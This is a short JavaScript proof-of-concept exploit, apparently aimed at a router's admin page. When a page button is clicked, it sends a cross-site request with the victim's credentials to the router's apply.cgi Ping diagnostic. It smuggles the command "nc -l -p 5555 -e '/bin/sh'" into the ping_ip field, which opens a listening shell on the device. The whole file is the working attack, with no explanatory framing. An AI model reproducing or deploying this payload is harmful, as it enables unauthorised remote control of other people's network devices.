function sendData() {
  var XHR = new XMLHttpRequest();
  var url = "http://10.3.1.3/apply.cgi";
  var form = "submit_button=Ping&action=ApplyTake&submit_type=start&change_action=gozila_cgi&next_page=Diagnostics.asp&ping_ip="  
  var attack_cmd = "nc -l -p 5555 -e '/bin/sh'"

  attack_cmd.replace(/ /g,"+");
  form += attack_cmd

  // Set up our request
  XHR.open('POST', url);
  XHR.withCredentials = true;
  //XHR.send();
  XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")

  XHR.send(form);
}


window.onload = function() {
	var button = document.getElementById("csrf-button");
	button.onclick = function() {
		sendData();
	}
}
